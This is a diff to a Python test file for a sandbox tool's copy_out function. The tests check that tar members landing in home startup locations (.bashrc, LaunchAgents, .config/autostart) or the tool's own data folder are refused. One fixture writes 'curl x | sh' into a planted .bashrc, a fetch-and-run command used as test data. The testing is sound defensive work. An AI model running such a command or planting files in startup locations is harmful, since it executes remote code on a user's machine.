@@ -813,6 +813,59 @@ def test_copy_out_drops_links_and_escapes(docker, mgr, monkeypatch, tmp_path):
     assert not (tmp_path / "escape.txt").exists()
 
 
+def test_copy_out_into_home_refuses_a_member_that_lands_in_its_configuration(docker, mgr,
+                                                                            monkeypatch, tmp_path):
+    """``sandbox_transfer copy_out`` with ``host_path=~``: home itself passes the tool's path
+    check, and a member named .bashrc would run at the next shell start. The whole stream is
+    judged first, so the harmless member ahead of it is not written either.
+
+    ``~/Library`` holds no VAF state, only ``LaunchAgents``: there the host half alone arms
+    the member check.
+
+    MUTATION: drop the per-member is_host_config check - red (.bashrc is written). Drop
+    holds_host_config from copy_out's check - the Library case goes red."""
+    import io
+    import tarfile
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("USERPROFILE", str(home))
+    payloads = {}
+    for target, members in (("home", (("notes.txt", b"harmless"), (".bashrc", b"curl x | sh"))),
+                            ("library", (("notes.txt", b"harmless"),
+                                         ("LaunchAgents/x.plist", b"<plist/>")))):
+        buf = io.BytesIO()
+        with tarfile.open(fileobj=buf, mode="w") as tar:
+            for name, body in members:
+                info = tarfile.TarInfo(name)
+                info.size = len(body)
+                tar.addfile(info, io.BytesIO(body))
+        payloads[target] = buf.getvalue()
+    current = {"payload": payloads["home"]}
+    env = mgr.create(ALICE)
+    real = docker.__call__
+
+    def _docker(args, timeout=60, **kw):
+        if args[0] == "exec" and "tar" in args and "-cf" in args:
+            return types.SimpleNamespace(returncode=0, stdout=current["payload"], stderr=b"")
+        return real(args, timeout, **kw)
+
+    monkeypatch.setattr(containers, "docker", _docker)
+    with pytest.raises(envmod.EnvironmentRefused, match="home directory's configuration"):
+        mgr.copy_out(ALICE, env.id, "out", str(home))
+    assert [p for p in home.rglob("*")] == []
+    library = home / "Library"
+    library.mkdir()
+    current["payload"] = payloads["library"]
+    with pytest.raises(envmod.EnvironmentRefused, match="home directory's configuration"):
+        mgr.copy_out(ALICE, env.id, "out", str(library))
+    assert [p for p in library.rglob("*")] == []
+    # Straight into a dot folder of home is refused before the stream is read.
+    with pytest.raises(envmod.EnvironmentRefused, match="home directory's configuration"):
+        mgr.copy_out(ALICE, env.id, "out", str(home / ".config" / "autostart"))
+    assert not (home / ".config").exists()
+
+
 def test_copy_out_refuses_a_member_that_lands_in_vafs_own_data(docker, mgr, monkeypatch, tmp_path):
     """The folders of the tar stream are chosen inside the environment. Into the PARENT of
     the data directory (not itself VAF's data, so the tool's own host check passes) a member
@@ -820,20 +873,23 @@ def test_copy_out_refuses_a_member_that_lands_in_vafs_own_data(docker, mgr, monk
     whole stream is judged before anything is written, so the harmless member ahead of it
     is not written either.
 
+    The target is the folder above XDG_DATA_HOME: XDG_DATA_HOME itself is the home
+    directory's configuration and refused before the stream is read.
+
     MUTATION: drop the pass over the members before the writes in copy_out - red."""
     import io
     import tarfile
-    xdg = tmp_path / "xdg-data"
+    xdg = tmp_path / "outer" / "xdg-data"
     monkeypatch.setenv("XDG_DATA_HOME", str(xdg))
     monkeypatch.setenv("LOCALAPPDATA", str(xdg))
     from vaf.core.platform import Platform
     data = Platform.data_dir()
-    host_dir = data.parent
+    host_dir = xdg.parent
     host_dir.mkdir(parents=True)
     buf = io.BytesIO()
     with tarfile.open(fileobj=buf, mode="w") as tar:
         for name, body in (("fonts/a.txt", b"harmless"),
-                           (f"{data.name}/custom_tools/e.py", b"print('planted')")):
+                           (f"{xdg.name}/{data.name}/custom_tools/e.py", b"print('planted')")):
             info = tarfile.TarInfo(name)
             info.size = len(body)
             tar.addfile(info, io.BytesIO(body))
